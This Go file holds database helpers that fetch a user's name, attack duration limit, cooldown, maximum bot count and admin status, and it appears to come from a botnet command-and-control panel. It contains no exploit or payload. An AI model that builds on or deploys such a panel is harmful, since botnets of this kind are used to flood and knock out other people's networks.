package main

func (s *Database) retrieveUsername(username string) string {
	var user string
	s.db.QueryRow("select username from users where username = ?", username).Scan(&user)
	return user
}

func (s *Database) retrieveDuration(username string) int {
	var durationValue int
	s.db.QueryRow("select duration_limit from users where username = ?", username).Scan(&durationValue)
	if durationValue == 0 || durationValue == -1 {
		durationValue = 86400
	}
	return durationValue
}

func (s *Database) retrieveCooldown(username string) int {
	var cooldownValue int
	s.db.QueryRow("select cooldown from users where username = ?", username).Scan(&cooldownValue)
	return cooldownValue
}

func (s *Database) retrieveMaxBots(username string, botcountt int) int {
	var maxBotsValue int
	s.db.QueryRow("select max_bots from users where username = ?", username).Scan(&maxBotsValue)
	if maxBotsValue == -1 {
		maxBotsValue = botcountt
	}
	return maxBotsValue
}

func (s *Database) retrieveAdmin(username string) string {
	var retrieveAdminValue int
	var adminTrue string = "true"
	var adminFalse string = "false"
	var adminValue string
	s.db.QueryRow("select admin from users where username = ?", username).Scan(&retrieveAdminValue)
	if retrieveAdminValue == 1 {
		adminValue = adminTrue
	}
	if retrieveAdminValue == 0 {
		adminValue = adminFalse
	}
	return adminValue
}